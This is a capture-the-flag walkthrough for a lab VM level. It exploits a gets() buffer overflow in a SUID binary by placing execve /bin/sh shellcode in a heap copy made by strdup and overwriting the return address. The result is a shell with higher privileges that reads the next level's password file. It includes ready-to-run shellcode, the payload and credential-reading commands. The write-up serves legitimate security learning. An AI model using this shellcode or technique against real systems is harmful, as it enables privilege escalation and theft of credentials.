# level2

## 1. Connect to the VM

The password for `level2` is the flag obtained from `level1`:

```bash
ssh level2@localhost -p 4242
```

## 2. Read the source

The equivalent C code obtained by decompiling the binary is available in
`source.c`.

## 3. Disassemble `main`

The binary is owned by `level3` and has the SUID bit set. It therefore runs
with `level3` privileges.

The source shows that `main` calls `gets`, which reads into a stack buffer
without checking its size. An input longer than the buffer can overwrite the
saved return address.

After the read, the binary inspects the overwritten return address and calls
`_exit(1)` if it falls in the `0xB0000000` range:

```c
if ((retaddr & 0xB0000000) == 0xB0000000)
    _exit(1);
```

This blocks the stack (`0xBFxxxxxx`) and the libc (`0xB7xxxxxx`), but not heap
addresses (`0x0804xxxx`).

Before returning, `main` calls `strdup(s)`, which copies the input buffer to
the heap and returns the heap pointer in `EAX`. The binary has no NX
protection, so shellcode placed in that heap region will execute directly:

```bash
readelf -l level2 | grep STACK
```

Output:

```text
GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
```

The strategy is to write shellcode at the start of the buffer so that
`strdup` copies it to the heap, then overwrite the return address with the
heap pointer.

Use `ltrace` to find the stable heap address returned by `strdup`:

```bash
ltrace ./level2 2>&1 <<< "AAAA" | grep strdup
```

Output:

```text
strdup("AAAA")                                   = 0x0804a008
```

With ASLR disabled on this VM, the address `0x0804a008` is stable across runs.

## 4. Find the offset

The offset is the number of bytes between the beginning of the buffer and the
saved return address.

`s` is at `[ebp-0x4C]`, which is 76 bytes below the saved EBP. The saved
return address sits 4 bytes above the saved EBP:

```text
76 (buffer → saved EBP) + 4 (saved EBP) = 80 bytes of padding
```

Confirm with GDB:

```bash
gdb ./level2
```

Inside GDB, start the program with a test pattern:

```gdb
run <<< $(python -c 'print "A"*80 + "BBBB"')
info registers eip
```

GDB reports:

```text
eip  0x42424242
```

`0x42` is the ASCII value of `B`, confirming the offset is **80 bytes**. The
final payload has this layout:

```text
+----------------------+--------------------------+----------------------+
| shellcode (25 bytes) | padding (55 bytes)       | heap addr (4 bytes)  |
| execve /bin/sh       | "A" * 55                 | 0x0804a008           |
+----------------------+--------------------------+----------------------+
```

The shellcode occupies the first 25 bytes, and the remaining `80 - 25 = 55`
bytes of padding fill the space up to the saved return address.

Because x86 stores integers in little-endian order, `0x0804a008` must be
written as:

```text
\x08\xa0\x04\x08
```

## 5. Exploit the binary

```bash
(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*55 + "\x08\xa0\x04\x08"'; cat) | ./level2
```

The return address is overwritten with the heap pointer. When `main` returns,
execution jumps to the shellcode copied by `strdup`, which spawns a shell. The
`cat` keeps stdin open so the shell stays alive.

Inside that shell, verify the effective user and read the next password:

```bash
id
cat /home/user/level3/.pass
```

The `id` output contains `euid=2023(level3)`, confirming that the shell has
the required privileges.

The same operation can be performed non-interactively:

```bash
(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*55 + "\x08\xa0\x04\x08"'; echo 'cat /home/user/level3/.pass') | ./level2
```

This prints the password stored in `flag`.
